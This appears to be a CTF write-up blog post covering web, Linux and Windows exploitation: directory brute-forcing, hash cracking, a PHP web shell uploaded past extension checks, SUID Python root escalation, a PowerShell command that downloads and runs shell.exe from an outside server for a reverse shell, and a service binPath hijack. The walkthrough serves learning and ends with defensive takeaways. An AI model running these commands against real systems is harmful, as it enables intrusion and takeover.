---
title: "Cracking the Code: A Deep Dive into CTF Challenges"
date: "2025-02-03"
author: "Sumon Nath"
tags: [CTF, cybersecurity, ethical hacking, write-up]
---

# Cracking the Code: A Deep Dive into CTF Challenges

CTF (Capture The Flag) competitions have become a staple for cybersecurity enthusiasts and professionals alike. These events challenge participants to exploit vulnerabilities, analyze cryptographic puzzles, and reverse-engineer binaries. In this blog, I'll walk you through my experience solving a recent CTF challenge, highlighting key methodologies and takeaways.

---

## Challenge: **Web & System Exploitation - "Hidden Secrets"**

### **Reconnaissance**
The first step in any CTF challenge is reconnaissance. Using `nmap`, I scanned the provided domain:

```bash
nmap -sC -sV -p- target-website.com
```

The scan revealed that the web server was running Apache 2.4.41 and had an open **robots.txt** file. A quick visit to `target-website.com/robots.txt` showed the following:

```
User-agent: *
Disallow: /admin
```

This hinted at a restricted `/admin` page. Time to dig deeper!

---

### **Finding Hidden Directories**
Using `gobuster`, I enumerated hidden directories:

```bash
gobuster dir -u http://target-website.com -w /usr/share/wordlists/dirb/common.txt
```

Bingo! It found `/admin-panel` and `/backup`. Checking `/backup`, I found an **old database dump (`backup.sql`)**. Downloading and inspecting it, I discovered a list of hashed passwords.

---

### **Cracking the Hashes**
With the hashes in hand, I used `hashcat` to crack them:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

One of the hashes revealed a password: `p@ssw0rd123`. Testing this on the `/admin-panel` login page granted me access!

---

## **Linux Exploitation**

### **Exploiting File Upload Vulnerability**
Inside the admin panel, there was a **file upload** functionality. My first test was uploading a simple `.php` file containing:

```php
<?php
  system($_GET['cmd']);
?>
```

Renaming it to `shell.php.jpg` bypassed client-side validation. Then, I accessed it via:

```
http://target-website.com/uploads/shell.php.jpg?cmd=whoami
```

Success! I gained remote command execution (RCE).

### **Privilege Escalation & Flag Capture**
Listing user privileges with:

```bash
ls -la /home/admin
```

I found a **flag.txt** file but had no read access. Checking for **SUID binaries**, I found:

```bash
find / -perm -4000 2>/dev/null
```

Among the results was `/usr/bin/python3.8`. Using it to escalate privileges:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Now as root, I read the flag:

```bash
cat /root/flag.txt
```

**FLAG: `CTF{linux_priv_esc_success}`**

---

## **Windows Exploitation**

### **SMB Enumeration**
Using `smbclient` to check for shared resources:

```bash
smbclient -L \\target-ip\ -U anonymous
```

A shared folder **'public'** was accessible, containing a PowerShell script.

### **Exploiting Weak PowerShell Scripts**
Examining `script.ps1`, I found hardcoded admin credentials:

```powershell
$username = "admin"
$password = "P@ssword123"
```

Using this, I connected via Remote Desktop:

```powershell
mstsc /v:target-ip
```

Once inside, I used `meterpreter` for post-exploitation:

```powershell
Invoke-WebRequest -Uri http://myserver/shell.exe -OutFile shell.exe
Start-Process shell.exe
```

I now had a reverse shell!

---

### **Privilege Escalation & Flag Capture (Windows)**
Checking for misconfigurations, I found a **vulnerable service running with SYSTEM privileges**. Exploiting it:

```powershell
sc config VulnService binPath= "C:\Users\Public\malicious.exe"
net start VulnService
```

This escalated my privileges to SYSTEM, allowing me to read:

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

**FLAG: `CTF{windows_priv_esc_success}`**

---

## **Key Takeaways**
1. **Always check `robots.txt` and backups** – they can reveal sensitive info.
2. **Directory brute-forcing is a must** for uncovering hidden admin panels.
3. **Weak password hashes can be cracked easily** – use strong, unique passwords.
4. **File upload vulnerabilities are still common** – always sanitize inputs.
5. **Privilege escalation via SUID binaries (Linux) & services (Windows)** is an effective way to gain root access.

---

## **Final Thoughts**
This CTF challenge was a great exercise in **web, Linux, and Windows exploitation**, showcasing real-world attack techniques. Whether you're a beginner or an expert, CTFs help sharpen skills and enhance problem-solving abilities.

Looking forward to the next challenge! 🚀

---

💡 **Want more CTF write-ups?** Stay tuned for more cybersecurity insights and walkthroughs!

